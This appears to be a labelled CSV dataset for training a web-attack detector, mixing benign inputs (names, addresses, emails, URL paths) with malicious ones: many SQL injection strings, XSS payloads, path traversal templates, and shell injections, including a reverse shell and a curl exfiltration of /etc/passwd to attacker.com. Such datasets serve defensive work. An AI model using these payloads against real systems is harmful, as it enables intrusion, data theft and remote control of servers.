payload,label
"veronica 126,",0
mame,0
/product?id=849381&utm_source=facebook&campaign=sale,0
4358738088308536,0
lizzi,0
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('xngr'='xngr",1
globula*riceo,0
carson,0
-8809'||(select 'hyzr' where 5694=5694 union all select 5694--,1
/home?q=contact594,0
capaz9,0
08502321a,0
"escultor bauls, 96,",0
"1"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""fqeu"" like ""fqeu",1
/assets/style.css?user=apple156,0
1') as rhvm where 1420=1420;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
d.antoni,0
"1"")) as wssb where 5772=5772;select (case when (7852=7476) then 7852 else 7852*(select 7852 from mysql.db) end)#",1
////../../../{file},1
/search?page=apple758,0
"1"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
"c/ costa verde, 100 4c",0
telmaco,0
menndez coyoma,0
leroy,0
mellvig@docerosas.sd,0
mochn quer,0
dotty,0
"1%"";if(8995=9787) select 8995 else drop function ofgg--",1
pancho cossio 69 4?h,0
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('bvdw'='bvdw",1
/login.html?page=kma253,0
1'||(select 'allj' where 7334=7334;begin dbms_lock.sleep(5); end)||',1
-1&{document.cookie=true;};,1
45182,0
"1') where 4786=4786 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
tableo,0
"1%""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",1
5x8r0r,0
4797639945557963,0
barbar ocaranza,0
/home?q=2026109,0
"1"") where 1673=1673 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
/team/verona/0oh9VM8u/statistics,0
/index.php?id=book217,0
1) and 7533=7533,1
"-4692%"")) union all select 1781,1781#",1
alarcon@24htranslations.cr,0
1'))) and 2006=2006,1
"1"") where 9020=9020 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1
piqueras,0
oruna,0
"1"") where 4971=4971 and 3824=benchmark(5000000,md5(0x76555642))--",1
/product?id=946617&utm_source=facebook&campaign=sale,0
/product/detail?page=admin518,0
"1"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1
somisett,0
zas,0
xelhuantzi bruns,0
ronet_huebner@nikemujeres.bm,0
29127,0
&LT;,1
"1%""))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""%""=""",1
/product?id=380854&utm_source=facebook&campaign=sale,0
machacn,0
<isindex type=image src=1 onerror=alert(1)>,1
jeremy6,0
1 where 7038=7038;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
/index.php?page=contact25,0
=,1
40380,0
4381135407580429,0
guadiana 149 6f,0
/login.html?page=apple532,0
<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>,1
"1"");select sleep(5)#",1
repulsivo,0
"1)) and 2388=benchmark(5000000,md5(0x6d457153))#",1
bentos campins,0
aldeanueva de santa cruz,0
/login?redirect_url=/dashboard/user/517329,0
/team/verona/hbj4654A/statistics,0
errol@diseodesoftware.ml,0
/index.php?q=contact66,0
/product/detail?q=admin882,0
vieta,0
cropper,0
1) and 8594=(select 8594 from pg_sleep(5))--,1
/api/v1/auth?token=i6STmQZf,0
/assets/style.css?token=123156,0
/product?id=987629&utm_source=facebook&campaign=sale,0
1' and (select * from (select(sleep(5)))fzno) and 'vwve' like 'vwve,1
"1') where 7541=7541;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
/product?id=853636&utm_source=facebook&campaign=sale,0
"EMBED SRC=""http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess=""never"" and allownetworking=""internal"" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:",1
1350447535832439,0
geesman,0
santa clara de avedillo,0
krug,0
demos3rativa,0
"-1639)) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((3318=3318",1
/team/verona/I1r7btQg/statistics,0
/api/v1/auth?token=povQPlSz,0
/product/detail?id=kma71,0
"1%';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
/home?token=apple45,0
; cat<</etc/passwd,1
salvatore,0
zarra,0
lucrecio,0
/iiiiiii{file},1
buscarin,0
terrs triola,0
zackaria8,0
/team/verona/kJL3vM3a/statistics,0
/home?user=123775,0
6569,0
edi,0
/team/verona/ksQtEYVZ/statistics,0
-3424')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('dyuo'='dyuo,1
"-1055"" or (8459=8459)*4906 and ""kdbr""=""kdbr",1
ptok@aou.com.th,0
62381470l,0
/search?page=book381,0
moldero,0
perero,0
"-4849"")) or (5005=9111)*9111 and ((""catv"" like ""catv",1
/login.html?id=kma624,0
cargaderos 79,0
/team/verona/BUsQDlj0/statistics,0
/search?q=kma815,0
andrease,0
lttecke,0
1764884801392734,0
////{file},1
anand,0
>| whoami,1
/api/v1/users?token=hải804,0
"-4641"") where 4212=4212 or make_set(3595=4062,4062)--",1
"1"" where 3434=3434;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
/api/v1/auth?token=hbL0oROl,0
22400,0
inmol4dor,0
& ping -c 15 127.0.0.1,1
7an8o15a,0
83585437x,0
cheuk7,0
1' in boolean mode) or 6793=(select 6793 from pg_sleep(5))#,1
1' and sleep(5)#,1
"florencio castillo, 111",0
/index.php?page=hải926,0
-4960') union all select 5300--,1
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",1
3580665595349534,0
supersticin,0
68201502q,0
1'+(select 'ymgm' where 8204=8204 and sleep(5)#,1
45295566x,0
9087,0
0285055545146355,0
45810,0
dantas.pellegrim4@nanotecnologo.kr,0
/team/verona/u0ZvG5ZS/statistics,0
/home?q=admin380,0
beasain,0
sant juli del llor i bonmat,0
8uiza1illo,0
/login?redirect_url=/dashboard/user/771288,0
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('gyre'='gyre",1
/assets/style.css?page=admin900,0
"1 where 8949=8949 and make_set(8403=8403,8899)--",1
6382,0
/product?id=589438&utm_source=facebook&campaign=sale,0
1') where 2763=2763;(select * from (select(sleep(5)))srmq)--,1
/team/verona/VkozfMcr/statistics,0
& netstat -tunlp,1
/index.php?q=123302,0
descerrajada,0
-6865) or (8459=8459)*4906 and (6107=6107,1
/login?redirect_url=/dashboard/user/340944,0
/login?redirect_url=/dashboard/user/96706,0
"1%"" and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""%""=""",1
"1"") as oztl where 6655=6655 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
/api/v1/users?id=kma167,0
alborea,0
a2b66r5z,0
efran,0
"1 where 4372=4372;select * from generate_series(3086,3086,case when (3086=3327) then 1 else 0 end) limit 1--",1
"<a href=""javascript:document.location='http://www.vulnerability-lab.com/'"">crosssitescripting</a>",1
"1') as uqkz where 8482=8482 and 8407=(select count(*) from generate_series(1,5000000))--",1
-9556') where 2472=2472 or (2883=9968)*9968--,1
/team/verona/JZO88lCA/statistics,0
18513875w,0
casilda,0
/api/v1/users?user=book248,0
"1%"")) union all select null,null,null,null,null,null--",1
"1"")) union all select null,null,null,null--",1
/api/v1/users?id=admin237,0
/product/detail?user=profile197,0
muntan pros,0
"calle llansa, s/n, 1a",0
"-5245""))) union all select 8106,8106,8106#",1
"c/ peru, 85, 10?h",0
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..{file},1
yuen-lung@hayunmundoahifuera.zm,0
"-9770')) as ovhh where 7903=7903 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"-3930%"")) order by 1#",1
/search?token=profile388,0
"1') where 1093=1093 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
7713842274771043,0
/product/detail?user=123835,0
"1%')) union all select null,null,null,null,null,null,null,null#",1
/login?redirect_url=/dashboard/user/92531,0
/..0x2f..0x2f..0x2f..0x2f..0x2f{file},1
"1%"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",1
aristbulo,0
"1' in boolean mode) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
/assets/style.css?page=123807,0
/product?id=922383&utm_source=facebook&campaign=sale,0
5408940503153342,0
/assets/style.css?id=book363,0
24,0
37244804f,0
casares portabella,0
68594124m,0
"1') where 1646=1646 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
bisad,0
valverde de valdelacasa,0
karem,0
21444030a,0
c/ sagrada familia 176,0
thieu,0
/product/detail?user=2026212,0
/assets/style.css?category=profile599,0
; cat /etc/passwd | id,1
1%');waitfor delay '0:0:5' and ('%'=',1
25617,0
"<A HREF=""htt	p://6&#9;6.000146.0x7.147/"">XSS</A>",1
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('rpof' like 'rpof",1
"1'||(select 'xhcr' from dual where 9279=9279;iif(2452=8999,1,1/0)",1
"c/ san blas 146,",0
/home?category=book395,0
5154,0
"1"")));begin user_lock.sleep(5); end--",1
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""rthl"" like ""rthl",1
"1"") where 2764=2764 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",1
05190,0
14li6l4,0
6317858667918423,0
1) and (7557=1711)*1711 and (5157=5157,1
"iif(1539=1539,1539,1/0)",1
abordonar,0
/login?redirect_url=/dashboard/user/274372,0
alcoberro cruells,0
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('novq'='novq",1
"-6406%') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='",1
depredador,0
/login.html?category=shoes27,0
adjani@zoorapia.ma,0
/api/v1/users?id=apple737,0
/product/detail?page=admin630,0
06673981w,0
/login.html?user=shoes323,0
/api/v1/users?category=admin316,0
aran,0
/product/detail?token=book441,0
/team/verona/1Bvav95i/statistics,0
5399041434530750,0
"1) where 9149=9149 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",1
/team/verona/xy7XfTYU/statistics,0
pinar vives,0
fulvia,0
smoot,0
nardi borgua,0
/product?id=618930&utm_source=facebook&campaign=sale,0
berrocal de huebra,0
"1"")) union all select null--",1
"-6254%'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
/api/v1/auth?token=ToOFfZZV,0
/api/v1/users?user=contact446,0
pche,0
potentado,0
89611985y,0
/api/v1/users?category=book727,0
1)) as svhd where 9761=9761;select case when 7717=7717 then 1 else null end--,1
$( echo vulnerable ),1
datario,0
"1"") as ghpx where 2873=2873 waitfor delay '0:0:5'--",1
/home?user=book198,0
pockett_miguelin@noviasteresapalacios.aw,0
"1%"")) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
/team/verona/Xh2bw0hG/statistics,0
|cat /etc/passwd|,1
83433277h,0
/api/v1/auth?token=XlKMKC3z,0
62386870z,0
"1',iif(6625=6625,1,1/0)",1
lippens27,0
1%' or (select * from (select(sleep(5)))sddo)#,1
1%');begin dbms_lock.sleep(5); end--,1
| ca$()t /etc/passwd,1
|id`echo`,1
/home?user=shoes514,0
"<select id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",1
franklyn,0
"1 where 8908=8908 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"-1525'))) union all select 4110,4110,4110,4110,4110,4110#",1
2ea6on9s,0
/login.html?user=2026404,0
/product?id=394161&utm_source=facebook&campaign=sale,0
"1"" where 8571=8571;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
|((id)),1
1'||(select 'mobv' from dual where 6338=6338;select sleep(5))||',1
drohocka@baybay.mq,0
/api/v1/users?category=contact133,0
von_semm,0
/search?q=kma242,0
-3378')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('otbq'='otbq,1
/team/verona/fX2lUe2r/statistics,0
/login?redirect_url=/dashboard/user/833181,0
10970,0
omura5,0
"1%') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('%'='",1
kinderman,0
/product?id=681672&utm_source=facebook&campaign=sale,0
nierola porcel,0
"1%"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
15280766a,0
"-1256' in boolean mode) union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",1
mucientes,0
/product/detail?q=hải26,0
40170,0
"1"");iif(5257=5257,1,1/0)",1
7192,0
floriano,0
"1;select * from generate_series(3341,3341,case when (3341=3072) then 1 else 0 end) limit 1--",1
/index.php?id=apple904,0
/api/v1/auth?token=Sfdc9k5E,0
-8007')) as bgpp where 9555=9555 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,1
litago,0
rdenas,0
trespalacios latorre,0
anselmo,0
0andiar,0
58c058ars4,0
1437,0
"1"" or sleep(5) and ""telb""=""telb",1
"1) as wust where 3884=3884 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1%"")));select pg_sleep(5) and (((""%""=""",1
/login.html?page=profile958,0
2753394337556822,0
c/ barja 187,0
583no,0
rached,0
; bash -i >& /dev/tcp/attacker.com/4444 0>&1,1
/login.html?token=2026859,0
/team/verona/m83bkrv6/statistics,0
/index.php?q=123216,0
15552,0
-2745)) as aywp where 9735=9735 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,1
nufrago,0
79564193v,0
0106705329803127,0
baretto0@drae2.tk,0
"1"");iif(9875=8961,1,1/0)",1
3465134997553259,0
"calle francisco gervas, 174, 9h",0
estiradamente,0
-1375'))) or (1226=9648)*9648 and ((('kfoy' like 'kfoy,1
......web-infweb.xml,1
9717,0
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""cecf""=""cecf",1
62128531b,0
/api/v1/auth?token=3D2cLqgk,0
& set,1
60210107v,0
1524943090962502,0
/login?redirect_url=/dashboard/user/576681,0
"1%')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
/team/verona/ZLgE6aKG/statistics,0
1') and (select * from (select(sleep(5)))fzno),1
keep_theberge9@aprendeaestudiar.gr,0
-3026) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),1
8282,0
chuanhsi,0
"1%"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""%""=""",1
buc_falo,0
20098056n,0
alio,0
"1%""))) and 2388=benchmark(5000000,md5(0x6d457153))#",1
decapitar,0
/assets/style.css?category=hải159,0
/product?id=178686&utm_source=facebook&campaign=sale,0
1) where 9344=9344;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
/login.html?user=contact216,0
5968115219030593,0
"1"")) as hdyn where 6027=6027 union all select null,null,null--",1
/product?id=534178&utm_source=facebook&campaign=sale,0
cerinza,0
/home?token=shoes355,0
kangelis,0
"1' or elt(6272=6272,sleep(5)) and 'fvtf' like 'fvtf",1
/api/v1/users?user=shoes167,0
"1 or 8466=benchmark(5000000,md5(0x694a4745))-- rlas",1
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6051=6051",1
cataquet ciavaglia,0
"1)) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
; cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com,1
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'aicu'='aicu",1
"\"";alert(document.cookie);//",1
tait,0
/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{file},1
/api/v1/auth?token=3VYQwc3i,0
"c/ francisco santos, 96",0
"1%')));iif(5257=5257,1,1/0)",1
kurt,0
8421938464583223,0
karina9,0
vila-seca,0
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('fwok' like 'fwok",1
iara,0
/search?category=contact879,0
campillo,0
castaldi.grasselli@expofloralzaragoza2014.pf,0
/index.php?id=contact720,0
1%'))) rlike (select * from (select(sleep(5)))sgvo) and ((('%'=',1
rea+tino,0
8869503887772031,0
56,0
/api/v1/auth?token=wBYEuhmc,0
nilsa,0
requena de campos,0
